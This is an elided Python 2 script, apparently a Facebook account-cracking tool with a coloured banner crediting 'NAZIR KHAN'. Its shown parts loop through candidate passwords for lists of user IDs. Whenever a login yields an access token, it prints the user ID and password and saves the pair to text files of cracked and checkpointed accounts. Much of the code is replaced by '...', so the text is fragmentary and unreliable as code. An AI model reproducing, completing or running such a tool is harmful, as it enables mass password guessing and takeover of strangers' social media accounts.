...
#!/usr/bin/python2
#coding=utf-8
#originally written (MAHADI HASAN AFRIDI)
try:
...
logo = """
     \033[1;95m   T)tttttt         
     \033[1;93m    T)                    
     \033[1;95m    T)     o)OOO   r)RRR  
     \033[1;93m    T)    o)   OO r)   RR 
     \033[1;92m    T)    o)   OO r)      
     \033[1;92m    T)     o)OOO  r)      
\033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: NAZIR KHAN
 \033[1;93m(*)\033[1;92m Facebook : AJMAL SHAH
 \033[1;93m(*)\033[1;92m Github   : github.com/NAZIR5
\033[1;93m-----------------------------------------------------
"""
def tool():
	os.system("clear")
...
def login():
	try:
		...
		print("\x1b[1;92m[2]\x1b[1;95m Login with token \x1b[1;92m[BEST]\n")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  ðŸ”¥NAZIR KHANðŸ”¥ START CRACKING.....")
			print('')
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					if "access_token" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [TOR-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("MAHADI-HASANok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [TOR-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("MAHADI-HASANok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [TOR-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("MAHADI-HASANok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [TOR-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("MAHADI-HASANok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [TOR-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("MAHADI-HASANok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [NAZIR-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("MAHADI-HASANcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
